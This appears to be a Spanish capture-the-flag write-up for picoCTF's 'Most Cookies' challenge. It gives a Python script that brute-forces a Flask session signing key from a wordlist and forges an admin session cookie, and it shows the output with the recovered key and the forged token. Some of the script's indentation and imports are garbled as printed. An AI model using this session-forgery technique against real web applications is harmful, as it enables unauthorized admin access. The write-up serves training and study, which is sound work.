## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)
## Solución

```
Para este reto se usara un script en python para poder crackear y saber cual es la cookie correcta:
```

```
import flask 
import hashlib 

from sys import argv 
from flask.json.tag 
import TaggedJSONSerializer from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature 

cookie = argv[1] cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] 

real_secret = '' 

for secret in cookie_names: 
	try: 
	serializer = URLSafeTimedSerializer( 
		secret_key=secret, 
		salt='cookie-session', 
		serializer=TaggedJSONSerializer(), 
		signer=TimestampSigner, 
		signer_kwargs={ 
			'key_derivation' : 'hmac', 
			'digest_method' : hashlib.sha1 
		}).loads(cookie) 
	except BadSignature: 
		continue 
		
	print(f'Secret key: {secret}') 
	real_secret = secret 
	
session = {'very_auth' : 'admin'} 
	
print(URLSafeTimedSerializer( 
	secret_key=real_secret, 
	salt='cookie-session',
	serializer=TaggedJSONSerializer(), 
	signer=TimestampSigner, 
	signer_kwargs={ 
		'key_derivation' : 'hmac', 
		'digest_method' : hashlib.sha1 
	}
 ).dumps(session))
```

```
PicoCTF % python3 cookie.py eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZvyWwQ.2Z-B50romCK6HtwMl2ODXB2vWzw
Secret key: peanut butter
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvyW0Q.jkNPg-VYwj-VPwqTP_7l0O-DL7c
```

![Most Cookies](/imagenes/MostCookies.png)
## Notas adicionales
## Referencias
[Most Cookies](https://ctftime.org/writeup/26978)